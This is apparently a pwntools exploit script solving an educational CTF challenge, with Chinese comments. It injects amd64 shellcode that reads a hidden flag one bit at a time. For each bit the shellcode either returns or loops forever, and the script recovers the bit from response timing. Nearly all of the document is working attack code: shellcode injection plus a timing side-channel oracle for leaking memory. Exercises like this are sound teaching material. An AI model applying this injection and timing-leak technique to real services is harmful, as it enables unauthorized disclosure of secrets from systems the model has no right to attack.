from pwn import *
context.arch='amd64'
context.terminal=['tmux','splitw','-h']
# r=process("./chal")
# gdb.attach(r,gdbscript="b *( main+337)")
ans=[]
for i in range(0x30):
    s=""
    for j in range (0,8):
        r=remote("edu-ctf.zoolab.org",10002)
        Payload=asm(f"""
                    mov rbx, qword ptr[rsp]
                    sub rbx , 0x13dc            #base_address
                    add rbx , 0x4040            #flag address
                    mov bl ,  [rbx+{i}]             #將pointer flag的一個一個bytes放入bl
                    and bl ,  {2**j}             #bit放入bl      0b01100110 01100010
                    cmp bl ,  0
                    je branch                #把cmp為0時進入branch的無窮迴圈
                    ret
                        branch:
                            lable:           #無窮迴圈
                                nop
                            jmp lable

                    """)
        
        r.sendafter('talk is cheap, show me the code',Payload)

        start = time.time()      
        r.recvall(timeout=2)
        end = time.time()
        r.close()
        if (end-start)>2: #
            s="0"+s #進入迴圈print(0)
        else:
            s="1"+s #沒有進入迴圈print(1)

    # import pdb;pdb.set_trace()
    ascii=int(s,2)
    # ascii=list(ascii)
    ascii=[ascii]
    ans+=ascii
    print(bytes(ascii))
    print(bytes(ans))
print(bytes(ans))
r.interactive()

